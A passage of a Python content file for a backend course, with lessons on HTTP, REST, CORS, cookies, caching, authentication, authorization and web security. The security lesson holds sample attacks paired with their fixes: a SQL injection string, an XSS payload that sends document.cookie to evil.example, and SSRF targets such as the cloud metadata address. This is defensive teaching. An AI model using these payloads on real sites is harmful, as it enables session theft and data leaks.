from app.content._build import lesson, question, section

CONTENT = {
    "be-http": lesson(
        "Every web API speaks HTTP. Learn what a request and a response contain, what the status codes mean, and how HTTPS and newer HTTP versions change the picture.",
        [
            section(
                "Anatomy of a request and a response",
                "A request has a **method** (GET, POST, PUT, PATCH, DELETE), a path with an optional query string, **headers** (metadata such as `Host`, `Content-Type` and `Authorization`) and an optional **body**. A response has a **status code**, headers and a body. HTTP/1.1 is plain text, so you can read it directly.",
                r'''
                GET /api/lessons/pg-joins HTTP/1.1
                Host: localhost:8000
                Accept: application/json

                HTTP/1.1 200 OK
                content-type: application/json
                content-length: 5321

                {"id": "pg-joins", "summary": "Joins combine rows from related tables..."}
                ''',
                "http",
            ),
            section(
                "Status codes",
                "The first digit gives the class: **1xx** informational; **2xx** success (200 OK, 201 Created, 204 No Content); **3xx** redirection (301 permanent, 302 and 307 temporary, 304 Not Modified); **4xx** client errors (400 bad request, 401 not authenticated, 403 not allowed, 404 not found, 409 conflict, 422 invalid input, 429 too many requests); and **5xx** server errors (500 bug, 502 bad gateway, 503 unavailable, 504 gateway timeout).\n\nClients decide what to do from the class: repeating a 4xx usually fails the same way, while a 503 may succeed later. Try it against this app's own API while the backend is running:",
                r'''
                import json
                from urllib.error import HTTPError
                from urllib.request import Request, urlopen

                request = Request("http://localhost:8000/api/health", headers={"Accept": "application/json"})
                with urlopen(request, timeout=5) as response:
                    print(response.status, response.headers["content-type"])   # 200 application/json
                    print(json.load(response))                                  # {'status': 'ok'}

                try:
                    urlopen("http://localhost:8000/api/lessons/not-a-lesson", timeout=5)
                except HTTPError as error:              # urllib raises for 4xx and 5xx responses
                    print(error.code, json.load(error))  # 404 {'detail': ...}
                ''',
            ),
            section(
                "HTTPS and HTTP versions",
                "**HTTPS** is HTTP inside TLS, which encrypts the traffic and proves the server's identity with a certificate. **HTTP/1.1** handles one request at a time per connection (keep-alive reuses connections). **HTTP/2** multiplexes many requests over one connection and compresses headers. **HTTP/3** runs over QUIC on UDP, which avoids head-of-line blocking when packets are lost and connects faster. Methods, status codes and headers stay the same, so your application code barely changes: servers, CDNs and load balancers handle the protocol.",
            ),
        ],
        [
            "A request is a method, URL, headers and an optional body; a response is a status, headers and a body.",
            "The status class tells clients what happened: 2xx success, 3xx redirect, 4xx client mistake, 5xx server problem.",
            "401 means 'who are you?'; 403 means 'I know who you are, and the answer is no'.",
            "HTTPS encrypts traffic and authenticates the server; HTTP/2 and HTTP/3 make connections more efficient.",
        ],
        r'''
        """Inspect requests to the running Build & Learn API (start the backend first)."""
        import json
        from urllib.error import HTTPError
        from urllib.request import Request, urlopen

        BASE = "http://localhost:8000"
        CLASSES = {1: "informational", 2: "success", 3: "redirection", 4: "client error", 5: "server error"}


        def call(method: str, path: str, body: dict | None = None) -> None:
            data = json.dumps(body).encode() if body is not None else None
            request = Request(BASE + path, data=data, method=method, headers={"Content-Type": "application/json"})
            try:
                with urlopen(request, timeout=5) as response:
                    status, headers, payload = response.status, response.headers, response.read()
            except HTTPError as error:
                status, headers, payload = error.code, error.headers, error.read()
            print(f"{method} {path} -> {status} ({CLASSES[status // 100]})")
            print("   content-type:", headers.get("content-type"))
            print("   body:", payload[:70].decode(errors="replace"))


        call("GET", "/api/health")                                   # 200 success
        call("GET", "/api/lessons/not-a-lesson")                     # 404 client error
        call("PUT", "/api/progress/not-a-lesson", {"completed": True})  # 404: unknown lesson
        call("POST", "/api/chat", {"messages": []})                  # 422: no question to answer
        ''',
        [
            question("A logged-in user requests an admin-only page. Which status fits best?",
                     ["401 Unauthorized", "403 Forbidden", "404 Not Found", "500 Internal Server Error"], 1,
                     "401 means the request isn't authenticated. Here the user is known but not allowed, so 403. Some APIs return 404 to hide that the page exists."),
            question("Which responses are generally worth retrying automatically?",
                     ["Any 4xx", "Server and gateway errors such as 502, 503 and 504", "2xx", "3xx"], 1,
                     "Server-side failures are often temporary. A 4xx usually fails the same way again; the exception is 429, which you retry after waiting."),
            question("What does HTTP/2 add over HTTP/1.1?",
                     ["Encryption", "Many concurrent requests over one connection (multiplexing)", "New HTTP methods", "Larger bodies"], 1,
                     "TLS provides encryption. HTTP/2 multiplexes streams over one connection and compresses headers."),
        ],
    ),
    "be-rest": lesson(
        "A good REST API is predictable: resources named with nouns, standard methods and status codes, consistent errors, and clear rules for paging and versioning.",
        [
            section(
                "Resources and methods",
                "Model the API around nouns (resources) and let HTTP methods supply the verbs: `GET /books` lists, `POST /books` creates, `GET /books/42` reads, `PUT /books/42` replaces, `PATCH /books/42` updates some fields and `DELETE /books/42` removes. Keep URLs lowercase and plural, and nest only for real ownership (`/users/7/loans`). Actions that don't fit CRUD can usually become resources too: `POST /loans` instead of `POST /borrowBook`.",
                r'''
                GET    /v1/books?author=austen&limit=20&after=40   list, filter and page
                POST   /v1/books                                   create      -> 201 + Location header
                GET    /v1/books/42                                read one    -> 200 or 404
                PATCH  /v1/books/42                                update some -> 200
                DELETE /v1/books/42                                delete      -> 204
                POST   /v1/loans                                   borrow a book (create a loan)
                GET    /v1/users/7/loans                           loans that belong to user 7
                ''',
                "text",
            ),
            section(
                "Consistent errors, paging and versioning",
                "Return errors in one shape everywhere, for example the Problem Details format (RFC 9457) with `type`, `title`, `status` and `detail`, so clients can handle every failure with one piece of code. Page every list and cap the page size; cursor pagination (\"give me items after id 40\") stays fast and stable as data changes. Put the major version in the path (`/v1/`) or a header, and bump it only for breaking changes: adding optional fields or new endpoints doesn't need a new version.",
                r'''
                from fastapi import APIRouter, FastAPI, HTTPException, Query, Request
                from fastapi.responses import JSONResponse
                from starlette.exceptions import HTTPException as StarletteHTTPException

                app = FastAPI()
                v1 = APIRouter(prefix="/v1")
                BOOKS = {i: {"id": i, "title": f"Book {i}"} for i in range(1, 101)}


                @app.exception_handler(StarletteHTTPException)
                async def problem_details(request: Request, exc: StarletteHTTPException) -> JSONResponse:
                    return JSONResponse(
                        status_code=exc.status_code,
                        media_type="application/problem+json",
                        content={"type": "about:blank", "title": exc.detail, "status": exc.status_code,
                                 "instance": request.url.path},
                    )


                @v1.get("/books")
                def list_books(limit: int = Query(20, ge=1, le=100), after: int = 0):
                    matches = [book for book_id, book in sorted(BOOKS.items()) if book_id > after]
                    page = matches[:limit]
                    return {"items": page, "next_cursor": page[-1]["id"] if len(matches) > limit else None}


                @v1.get("/books/{book_id}")
                def get_book(book_id: int):
                    if book_id not in BOOKS:
                        raise HTTPException(status_code=404, detail="Book not found")
                    return BOOKS[book_id]


                app.include_router(v1)
                ''',
            ),
        ],
        [
            "Use plural nouns for resources and HTTP methods for the verbs.",
            "Return one consistent error format, such as RFC 9457 Problem Details.",
            "Paginate every list and cap the page size; cursors scale better than offsets.",
            "Version only for breaking changes; adding optional fields is backwards compatible.",
        ],
        r'''
        from fastapi import FastAPI, HTTPException, Query, Response
        from fastapi.testclient import TestClient
        from pydantic import BaseModel, Field

        app = FastAPI(title="Library API", version="1.0")
        books: dict[int, dict] = {}
        loans: dict[int, dict] = {}


        class BookIn(BaseModel):
            title: str = Field(min_length=1, max_length=200)
            author: str = Field(min_length=1, max_length=100)


        class LoanIn(BaseModel):
            book_id: int
            user_id: int


        @app.post("/v1/books", status_code=201)
        def create_book(book: BookIn, response: Response):
            book_id = len(books) + 1
            books[book_id] = {"id": book_id, **book.model_dump()}
            response.headers["Location"] = f"/v1/books/{book_id}"
            return books[book_id]


        @app.get("/v1/books")
        def list_books(author: str | None = None, limit: int = Query(20, ge=1, le=100), after: int = 0):
            matches = [b for b in books.values() if b["id"] > after and author in (None, b["author"])]
            page = matches[:limit]
            return {"items": page, "next_cursor": page[-1]["id"] if len(matches) > limit else None}


        @app.post("/v1/loans", status_code=201)
        def borrow(loan: LoanIn):
            if loan.book_id not in books:
                raise HTTPException(404, "Book not found")
            if any(existing["book_id"] == loan.book_id for existing in loans.values()):
                raise HTTPException(409, "Book is already on loan")
            loan_id = len(loans) + 1
            loans[loan_id] = {"id": loan_id, **loan.model_dump()}
            return loans[loan_id]


        @app.get("/v1/users/{user_id}/loans")
        def user_loans(user_id: int):
            return {"items": [loan for loan in loans.values() if loan["user_id"] == user_id]}


        client = TestClient(app)
        for title, author in [("Emma", "Austen"), ("Persuasion", "Austen"), ("Dune", "Herbert")]:
            created = client.post("/v1/books", json={"title": title, "author": author})
        print(created.status_code, created.headers["location"])                 # 201 /v1/books/3

        page1 = client.get("/v1/books", params={"author": "Austen", "limit": 1}).json()
        page2 = client.get("/v1/books", params={"author": "Austen", "limit": 1, "after": page1["next_cursor"]}).json()
        print(page1["items"][0]["title"], "then", page2["items"][0]["title"])    # Emma then Persuasion

        print(client.post("/v1/loans", json={"book_id": 1, "user_id": 7}).status_code)   # 201
        print(client.post("/v1/loans", json={"book_id": 1, "user_id": 8}).status_code)   # 409: already on loan
        print(client.post("/v1/books", json={"title": "", "author": "x"}).status_code)   # 422: invalid input
        print(client.get("/v1/users/7/loans").json())
        ''',
        [
            question("Which endpoint best follows REST conventions for borrowing a book?",
                     ["POST /borrowBook?id=42", "GET /books/42/borrow", "POST /loans with {\"book_id\": 42}", "PUT /borrow"], 2,
                     "Model the action as creating a loan resource. A GET must never change state, because browsers, crawlers and caches repeat GETs freely."),
            question("What is the difference between PUT and PATCH?",
                     ["There is none", "PUT replaces the whole resource; PATCH changes only the fields sent", "PATCH creates and PUT deletes", "PUT is only for files"], 1,
                     "Sending a PUT without a field removes or resets it; a PATCH leaves unsent fields alone."),
            question("Which change requires a new API version?",
                     ["Adding an optional response field", "Adding a new endpoint", "Renaming a field that clients read", "Fixing a typo in the docs"], 2,
                     "Renaming or removing fields breaks existing clients. Additive changes don't, as long as clients ignore fields they don't know."),
        ],
    ),
    "be-browser-rules": lesson(
        "Browsers enforce rules that every backend must cooperate with: the same-origin policy and CORS, cookie security attributes, and caching headers that can save most of your traffic.",
        [
            section(
                "Same-origin policy and CORS",
                "An **origin** is scheme + host + port, so `http://localhost:5173` and `http://localhost:8000` are different origins. Browsers stop JavaScript from reading responses from another origin unless the server allows it with CORS headers such as `Access-Control-Allow-Origin`. For requests that aren't 'simple' (for example JSON POSTs or custom headers) the browser first sends an `OPTIONS` **preflight** request. CORS only protects browser users: it isn't authentication, and curl ignores it completely.\n\nThis app avoids CORS entirely: in development Vite proxies `/api` to the backend, and in production FastAPI serves the web app and the API from the same origin.",
                r'''
                from fastapi import FastAPI
                from fastapi.middleware.cors import CORSMiddleware

                app = FastAPI()
                app.add_middleware(
                    CORSMiddleware,
                    allow_origins=["https://app.example.com", "http://localhost:5173"],  # never "*" with credentials
                    allow_methods=["GET", "POST", "PUT", "DELETE"],
                    allow_headers=["Content-Type", "Authorization"],
                    allow_credentials=True,
                )
                ''',
            ),
            section(
                "Cookies that are hard to steal",
                "Session cookies should be `HttpOnly` (JavaScript can't read them, which limits the damage of XSS), `Secure` (sent only over HTTPS) and `SameSite=Lax` or `Strict` (not sent on most cross-site requests, which blocks most CSRF). Give them a sensible lifetime with `Max-Age`.",
                r'''
                import secrets

                from fastapi import FastAPI, Response

                app = FastAPI()


                @app.post("/login")
                def login(response: Response):
                    session_id = secrets.token_urlsafe(32)     # store it server-side with the user's id
                    response.set_cookie(
                        "session", session_id,
                        httponly=True, secure=True, samesite="lax", max_age=60 * 60 * 8,
                    )
                    return {"ok": True}
                ''',
            ),
            section(
                "HTTP caching with Cache-Control and ETag",
                "`Cache-Control` tells browsers and CDNs what they may store: `public, max-age=31536000, immutable` for versioned static files, `no-store` for private data, and `no-cache` to store but check with the server every time. An **ETag** is a fingerprint of the response. The client sends it back in `If-None-Match`, and if nothing changed the server replies `304 Not Modified` with an empty body.",
                r'''
                import hashlib
                import json

                from fastapi import FastAPI, Request, Response

                app = FastAPI()
                COURSES = [{"id": "python", "title": "Python Foundations"}]


                @app.get("/courses")
                def courses(request: Request):
                    body = json.dumps(COURSES).encode()
                    etag = '"' + hashlib.sha256(body).hexdigest()[:16] + '"'
                    headers = {"ETag": etag, "Cache-Control": "no-cache"}
                    if request.headers.get("if-none-match") == etag:
                        return Response(status_code=304, headers=headers)
                    return Response(body, media_type="application/json", headers=headers)
                ''',
            ),
        ],
        [
            "An origin is scheme + host + port; CORS lets a server allow cross-origin reads by browsers.",
            "CORS is a browser safety rule, not access control: still authenticate every request.",
            "Mark session cookies HttpOnly, Secure and SameSite.",
            "Cache-Control decides who may store a response; an ETag turns repeat downloads into tiny 304s.",
        ],
        r'''
        import hashlib
        import json

        from fastapi import FastAPI, HTTPException, Request, Response
        from fastapi.middleware.cors import CORSMiddleware
        from fastapi.testclient import TestClient

        FRONTEND = "http://localhost:5173"
        app = FastAPI()
        app.add_middleware(CORSMiddleware, allow_origins=[FRONTEND], allow_methods=["GET", "PUT"],
                           allow_headers=["Content-Type"])
        LESSONS = {"pg-joins": {"title": "Combine tables with joins"}}


        @app.get("/lessons/{lesson_id}")
        def get_lesson(lesson_id: str, request: Request):
            if lesson_id not in LESSONS:
                raise HTTPException(404, "Lesson not found")
            body = json.dumps(LESSONS[lesson_id]).encode()
            etag = f'"{hashlib.sha256(body).hexdigest()[:16]}"'
            headers = {"ETag": etag, "Cache-Control": "no-cache"}
            if request.headers.get("if-none-match") == etag:
                return Response(status_code=304, headers=headers)
            return Response(body, media_type="application/json", headers=headers)


        client = TestClient(app)

        preflight = client.options("/lessons/pg-joins", headers={
            "Origin": FRONTEND, "Access-Control-Request-Method": "PUT", "Access-Control-Request-Headers": "Content-Type",
        })
        print(preflight.status_code, preflight.headers["access-control-allow-origin"])   # 200 http://localhost:5173

        other = client.get("/lessons/pg-joins", headers={"Origin": "https://evil.example"})
        print("allowed origin for evil.example:", other.headers.get("access-control-allow-origin"))  # None

        first = client.get("/lessons/pg-joins")
        again = client.get("/lessons/pg-joins", headers={"If-None-Match": first.headers["etag"]})
        print(first.status_code, len(first.content), "bytes")    # 200 with the JSON body
        print(again.status_code, len(again.content), "bytes")    # 304 with 0 bytes
        ''',
        [
            question("Which pair of URLs has the same origin?",
                     ["http://example.com and https://example.com", "http://localhost:5173 and http://localhost:8000",
                      "https://example.com/a and https://example.com/b", "https://api.example.com and https://example.com"], 2,
                     "Origin is scheme + host + port. Only the path differs in the third pair; the others differ in scheme, port or host."),
            question("What does the HttpOnly cookie attribute do?",
                     ["Sends the cookie only over HTTPS", "Stops JavaScript from reading the cookie", "Blocks cross-site requests", "Encrypts the cookie"], 1,
                     "Secure means HTTPS only, and SameSite controls cross-site sending. HttpOnly hides the cookie from scripts, including injected ones."),
            question("A client sends If-None-Match with the current ETag. What should the server return?",
                     ["200 with the full body", "304 Not Modified with no body", "204 No Content", "412 Precondition Failed"], 1,
                     "304 tells the client its cached copy is still valid, so nothing is downloaded again."),
        ],
    ),
    "be-auth": lesson(
        "Authentication proves who a user is. Store passwords as slow, salted hashes, then remember the user with a server-side session or a signed token.",
        [
            section(
                "Store passwords as slow, salted hashes",
                "Never store passwords, or encrypted passwords that could be decrypted. Store a hash from a deliberately slow algorithm (Argon2id, bcrypt or scrypt) with a random **salt** per user, so leaked hashes are expensive to crack and identical passwords produce different hashes. Compare with `hmac.compare_digest`, which takes the same time whether or not the values match. Python's standard library includes scrypt:",
                r'''
                import hashlib
                import hmac
                import os


                def hash_password(password: str) -> str:
                    salt = os.urandom(16)
                    digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
                    return f"scrypt${salt.hex()}${digest.hex()}"


                def verify_password(password: str, stored: str) -> bool:
                    _, salt_hex, digest_hex = stored.split("$")
                    digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt_hex), n=2**14, r=8, p=1)
                    return hmac.compare_digest(digest.hex(), digest_hex)


                stored = hash_password("correct horse battery staple")
                print(stored[:45] + "...")
                print(verify_password("correct horse battery staple", stored))   # True
                print(verify_password("password123", stored))                    # False
                ''',
            ),
            section(
                "Sessions or tokens",
                "After login, the server must recognise the user on later requests. With a **session**, the server stores the session and gives the browser a random ID in a cookie; logging out deletes it immediately. With a **token** such as a JWT, the server signs the user's claims (user ID, roles, expiry) and the client sends it as `Authorization: Bearer <token>`. Any server with the key can verify it without a database lookup, but revoking it before it expires takes extra work, so access tokens are short-lived (minutes) and paired with a longer-lived refresh token.\n\nA JWT is three base64url parts: header.payload.signature. It's **signed, not encrypted**, so anyone can read the payload: never put secrets in it. In production, use a maintained library such as PyJWT, which also checks expiry and algorithms for you.",
                r'''
                import base64
                import hashlib
                import hmac
                import json
                import time

                SECRET = b"load-me-from-an-environment-variable"


                def b64(data: bytes) -> str:
                    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


                def sign(claims: dict) -> str:
                    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
                    payload = b64(json.dumps(claims).encode())
                    signature = hmac.new(SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest()
                    return f"{header}.{payload}.{b64(signature)}"


                token = sign({"sub": "user-42", "role": "student", "exp": int(time.time()) + 900})
                print(token)
                print(base64.urlsafe_b64decode(token.split(".")[1] + "=="))   # anyone can read the claims
                ''',
            ),
        ],
        [
            "Hash passwords with Argon2id, bcrypt or scrypt and a per-user salt; never store or encrypt them.",
            "Sessions are easy to revoke; signed tokens are stateless but hard to revoke early.",
            "JWTs are signed, not encrypted: anyone can read the payload.",
            "Keep access tokens short-lived and use refresh tokens to get new ones.",
        ],
        r'''
        import base64
        import hashlib
        import hmac
        import json
        import os
        import time

        SECRET = os.environ.get("TOKEN_SECRET", "dev-only-secret").encode()


        def hash_password(password: str) -> str:
            salt = os.urandom(16)
            digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
            return f"scrypt${salt.hex()}${digest.hex()}"


        def verify_password(password: str, stored: str) -> bool:
            _, salt_hex, digest_hex = stored.split("$")
            digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt_hex), n=2**14, r=8, p=1)
            return hmac.compare_digest(digest.hex(), digest_hex)


        def _b64(data: bytes) -> str:
            return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


        def _unb64(text: str) -> bytes:
            return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


        def issue_token(user_id: str, ttl_seconds: int = 900) -> str:
            header = _b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
            payload = _b64(json.dumps({"sub": user_id, "exp": int(time.time()) + ttl_seconds}).encode())
            signature = hmac.new(SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest()
            return f"{header}.{payload}.{_b64(signature)}"


        def verify_token(token: str) -> dict:
            header, payload, signature = token.split(".")
            expected = hmac.new(SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest()
            if not hmac.compare_digest(expected, _unb64(signature)):
                raise ValueError("bad signature")
            claims = json.loads(_unb64(payload))
            if claims["exp"] < time.time():
                raise ValueError("token expired")
            return claims


        users = {"ada": hash_password("correct horse battery staple")}
        assert verify_password("correct horse battery staple", users["ada"])
        assert not verify_password("wrong guess", users["ada"])

        token = issue_token("ada")
        print(verify_token(token))                      # {'sub': 'ada', 'exp': ...}

        header, payload, signature = token.split(".")
        forged_payload = _b64(json.dumps({"sub": "admin", "exp": 9999999999}).encode())
        for bad in (f"{header}.{forged_payload}.{signature}", issue_token("ada", ttl_seconds=-1)):
            try:
                verify_token(bad)
            except ValueError as error:
                print("rejected:", error)               # bad signature, then token expired
        ''',
        [
            question("Why use a slow hash such as scrypt or bcrypt for passwords?",
                     ["To save storage", "So attackers who steal the hashes can try far fewer guesses per second", "So users can recover their passwords", "Because SHA-256 output is too short"], 1,
                     "Fast hashes let attackers test billions of guesses per second on a GPU; slow, memory-hard hashes cut that dramatically."),
            question("What does a salt protect against?",
                     ["Slow logins", "Precomputed (rainbow-table) attacks and identical hashes for identical passwords", "Phishing", "SQL injection"], 1,
                     "A unique random salt per password means each hash must be attacked separately."),
            question("Which statement about JWTs is true?",
                     ["The payload is encrypted", "Anyone can decode the payload; the signature only proves it wasn't changed", "They can't expire", "They must be stored in a database"], 1,
                     "JWTs are base64url-encoded and signed. Put only non-secret claims in them and always check the expiry."),
        ],
    ),
    "be-authz": lesson(
        "Authorization decides what an authenticated user may do. Check it on the server for every request and every object, and use OAuth 2.0 when users sign in with another provider.",
        [
            section(
                "Roles and ownership checks",
                "**Role-based access control** (RBAC) maps users to roles and roles to permissions: an `admin` can delete orders. Roles aren't enough on their own: you must also check that the **object** belongs to the user. Skipping that check is called broken object-level authorization (BOLA, also known as IDOR), and it's the top risk in the OWASP API Security Top 10: changing `/orders/101` to `/orders/102` must never show someone else's order. In FastAPI, put the checks in dependencies so routes can't forget them.",
                r'''
                from fastapi import Depends, FastAPI, Header, HTTPException

                app = FastAPI()
                USERS = {"token-ada": {"id": 1, "role": "admin"}, "token-bob": {"id": 2, "role": "customer"}}
                ORDERS = {101: {"id": 101, "owner_id": 2, "total": 30}}


                def current_user(authorization: str = Header(default="")) -> dict:
                    user = USERS.get(authorization.removeprefix("Bearer "))
                    if user is None:
                        raise HTTPException(401, "Not authenticated", headers={"WWW-Authenticate": "Bearer"})
                    return user


                def require_role(role: str):
                    def check(user: dict = Depends(current_user)) -> dict:
                        if user["role"] != role:
                            raise HTTPException(403, "Not allowed")
                        return user
                    return check


                @app.get("/orders/{order_id}")
                def read_order(order_id: int, user: dict = Depends(current_user)):
                    order = ORDERS.get(order_id)
                    if order is None or (order["owner_id"] != user["id"] and user["role"] != "admin"):
                        raise HTTPException(404, "Order not found")    # 404 hides that the order exists
                    return order


                @app.delete("/orders/{order_id}", status_code=204)
                def delete_order(order_id: int, admin: dict = Depends(require_role("admin"))):
                    ORDERS.pop(order_id, None)
                ''',
            ),
            section(
                "OAuth 2.0 and OpenID Connect",
                "OAuth 2.0 lets an app act for a user without ever seeing their password. In the **authorization code flow with PKCE**, the app redirects the user to the provider (Google, GitHub), the user signs in and approves the requested scopes, the provider redirects back with a one-time code, and the app's backend exchanges that code, plus a secret **code verifier**, for tokens. OAuth is about authorization (access to an API); **OpenID Connect** adds an ID token that says who the user is, which is what 'Sign in with Google' uses. Use a well-tested library rather than writing the flow yourself; this snippet only shows what PKCE sends.",
                r'''
                import base64
                import hashlib
                import secrets

                verifier = secrets.token_urlsafe(64)                    # kept secret by the app
                challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
                state = secrets.token_urlsafe(16)                        # checked on return, to stop CSRF

                print(
                    "https://accounts.example.com/authorize?response_type=code&client_id=my-app"
                    "&redirect_uri=https://app.example.com/callback&scope=openid%20email"
                    f"&state={state}&code_challenge={challenge}&code_challenge_method=S256"
                )
                ''',
            ),
        ],
        [
            "Authentication answers 'who are you?'; authorization answers 'what may you do?'.",
            "Check ownership of every object, not just the user's role, to prevent BOLA (IDOR).",
            "Enforce permissions on the server; hiding a button in the UI isn't security.",
            "OAuth 2.0 grants access to APIs and OpenID Connect adds login; use the authorization code flow with PKCE.",
        ],
        r'''
        from fastapi import Depends, FastAPI, Header, HTTPException
        from fastapi.testclient import TestClient

        app = FastAPI()
        USERS = {
            "token-ada": {"id": 1, "role": "admin"},
            "token-bob": {"id": 2, "role": "customer"},
            "token-cy": {"id": 3, "role": "customer"},
        }
        ORDERS = {101: {"id": 101, "owner_id": 2, "total": 30}, 102: {"id": 102, "owner_id": 3, "total": 12}}


        def current_user(authorization: str = Header(default="")) -> dict:
            user = USERS.get(authorization.removeprefix("Bearer "))
            if user is None:
                raise HTTPException(401, "Not authenticated", headers={"WWW-Authenticate": "Bearer"})
            return user


        def require_admin(user: dict = Depends(current_user)) -> dict:
            if user["role"] != "admin":
                raise HTTPException(403, "Admins only")
            return user


        @app.get("/orders/{order_id}")
        def read_order(order_id: int, user: dict = Depends(current_user)):
            order = ORDERS.get(order_id)
            if order is None or (order["owner_id"] != user["id"] and user["role"] != "admin"):
                raise HTTPException(404, "Order not found")
            return order


        @app.delete("/orders/{order_id}", status_code=204)
        def delete_order(order_id: int, _: dict = Depends(require_admin)):
            if ORDERS.pop(order_id, None) is None:
                raise HTTPException(404, "Order not found")


        client = TestClient(app)
        bob, ada = {"Authorization": "Bearer token-bob"}, {"Authorization": "Bearer token-ada"}
        print(client.get("/orders/101").status_code)                   # 401: no token
        print(client.get("/orders/101", headers=bob).status_code)      # 200: Bob owns it
        print(client.get("/orders/102", headers=bob).status_code)      # 404: Cy's order stays hidden
        print(client.delete("/orders/101", headers=bob).status_code)   # 403: Bob isn't an admin
        print(client.delete("/orders/101", headers=ada).status_code)   # 204: admins may delete
        ''',
        [
            question("A user changes /orders/101 to /orders/102 in the URL and sees another customer's order. What is this?",
                     ["XSS", "Broken object-level authorization (IDOR)", "CSRF", "A CORS error"], 1,
                     "The server trusted the ID without checking ownership. Scope every lookup to the current user."),
            question("Where must permission checks run?",
                     ["Only in the frontend", "On the server, for every request", "Only at login", "In database backups"], 1,
                     "Anyone can call your API directly with curl, so frontend checks are only for convenience."),
            question("What does OpenID Connect add to OAuth 2.0?",
                     ["Encryption", "An ID token that identifies the user, enabling login", "Rate limiting", "Password storage"], 1,
                     "Plain OAuth grants access to APIs; OpenID Connect standardises who the user is."),
        ],
    ),
    "be-security": lesson(
        "Most breaches exploit a handful of well-known mistakes. Learn the main web risks, how attackers use them, and the simple, reliable defences.",
        [
            section(
                "Injection: keep data out of code",
                "Injection happens when untrusted input becomes part of a command: SQL, a shell command or a template. The fix is always the same: pass data separately from code. Use parameterized queries for SQL and argument lists (never `shell=True`) for processes. Validate input too, but never rely on escaping strings by hand.",
                r'''
                import sqlite3

                db = sqlite3.connect(":memory:")
                db.execute("CREATE TABLE users (name TEXT, is_admin INTEGER)")
                db.executemany("INSERT INTO users VALUES (?, ?)", [("ada", 1), ("bob", 0)])

                name = "nobody' OR '1'='1"
                unsafe = f"SELECT name FROM users WHERE name = '{name}'"
                print(db.execute(unsafe).fetchall())                                      # every user leaks
                print(db.execute("SELECT name FROM users WHERE name = ?", (name,)).fetchall())   # []
                ''',
            ),
            section(
                "XSS and CSRF",
                "**Cross-site scripting (XSS)** happens when user input is inserted into a page as HTML, so an attacker's script runs in other users' browsers. Escape output for its context (templating engines and frameworks such as React do this by default), avoid inserting raw HTML, and add a Content-Security-Policy header. This app escapes every value with `escapeHtml` before putting it on the page.\n\n**Cross-site request forgery (CSRF)** tricks a logged-in user's browser into sending a request to your site from another site, with their cookies attached. Defend with `SameSite` cookies, CSRF tokens for cookie-based forms, and by never changing state on GET.",
                r'''
                import html

                comment = '<img src=x onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">'
                print(f"<p>{comment}</p>")               # dangerous: the browser would run the script
                print(f"<p>{html.escape(comment)}</p>")  # safe: shown as plain text
                ''',
            ),
            section(
                "SSRF and secrets",
                "**Server-side request forgery (SSRF)**: a feature that fetches a URL for the user (link previews, webhooks, image imports) can be pointed at internal addresses, such as the cloud metadata service at `169.254.169.254`, which hands out credentials, or `localhost:6379`. Allow only `https`, resolve the host and reject private, loopback and link-local addresses, and prefer an allowlist of domains. Then connect to the address you checked, or an attacker can change DNS between your check and the request (DNS rebinding).\n\nKeep secrets in environment variables or a secrets manager, never in code or git, and give each service only the permissions it needs.",
                r'''
                import ipaddress
                import socket
                from urllib.parse import urlparse


                def is_safe_url(url: str) -> bool:
                    parts = urlparse(url)
                    if parts.scheme != "https" or not parts.hostname:
                        return False
                    try:
                        addresses = {info[4][0] for info in socket.getaddrinfo(parts.hostname, 443)}
                    except socket.gaierror:
                        return False
                    return all(ipaddress.ip_address(address).is_global for address in addresses)


                print(is_safe_url("http://169.254.169.254/latest/meta-data/"))   # False: not https
                print(is_safe_url("https://127.0.0.1/admin"))                     # False: loopback
                ''',
            ),
        ],
        [
            "Keep data separate from code: parameterized queries and argument lists, never string building.",
            "Escape output for its context to stop XSS, and add a Content-Security-Policy.",
            "SameSite cookies and CSRF tokens stop forged requests; never change state on GET.",
            "Check outbound URLs against private addresses to stop SSRF, and keep secrets out of code.",
        ],
        r'''
        import html
        import ipaddress
        import socket
        import sqlite3
        from urllib.parse import urlparse

        db = sqlite3.connect(":memory:")
        db.execute("CREATE TABLE products (name TEXT, price REAL)")
        db.executemany("INSERT INTO products VALUES (?, ?)", [("pen", 1.5), ("book", 12.0)])


        # 1. SQL injection: the search term used to be formatted into the SQL string.
        def search_products(term: str) -> list[tuple]:
            return db.execute("SELECT name, price FROM products WHERE name LIKE ?", (f"%{term}%",)).fetchall()


        # 2. XSS: the review used to be inserted into HTML unescaped.
        def render_review(author: str, text: str) -> str:
            return f"<article><h3>{html.escape(author)}</h3><p>{html.escape(text)}</p></article>"


        # 3. SSRF: the link-preview feature used to fetch any URL, including internal ones.
        def is_safe_url(url: str) -> bool:
            parts = urlparse(url)
            if parts.scheme != "https" or not parts.hostname:
                return False
            try:
                addresses = {info[4][0] for info in socket.getaddrinfo(parts.hostname, 443)}
            except socket.gaierror:
                return False
            return all(ipaddress.ip_address(address).is_global for address in addresses)


        assert search_products("' OR '1'='1") == []                # the injection attempt finds nothing
        assert search_products("pe") == [("pen", 1.5)]
        assert "<script>" not in render_review("eve", "<script>alert(1)</script>")
        assert not is_safe_url("http://example.com")                 # not HTTPS
        assert not is_safe_url("https://127.0.0.1/admin")            # loopback
        assert not is_safe_url("https://10.0.0.5/")                  # private network
        assert not is_safe_url("https://169.254.169.254/")           # cloud metadata (link-local)
        print("All three vulnerabilities are fixed.")
        ''',
        [
            question("What is the reliable fix for SQL injection?",
                     ["Removing quotes from input", "Parameterized queries", "Hiding error messages", "Using POST instead of GET"], 1,
                     "Parameters are sent separately from the SQL text, so input can never change the query's structure."),
            question("Which attack makes a logged-in user's browser send an unwanted request to your site?",
                     ["XSS", "CSRF", "SSRF", "SQL injection"], 1,
                     "CSRF abuses the cookies the browser attaches automatically; SameSite cookies and CSRF tokens stop it."),
